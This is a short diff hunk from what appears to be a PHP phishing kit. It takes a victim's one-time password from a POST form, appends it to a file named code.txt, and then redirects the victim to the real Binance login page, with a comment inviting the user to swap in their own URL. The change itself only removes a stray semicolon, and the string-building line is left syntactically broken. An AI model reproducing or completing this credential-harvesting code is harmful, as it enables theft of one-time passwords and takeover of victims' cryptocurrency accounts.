@@ -8,7 +8,7 @@ if (
     $file = "code.txt";
     $data = 
         "otp: " . $_POST['otp'] . "\n" .
-;
+
 
     file_put_contents($file, $data, FILE_APPEND);
     header('Location: https://accounts.binance.com/'); // Replace with your URL
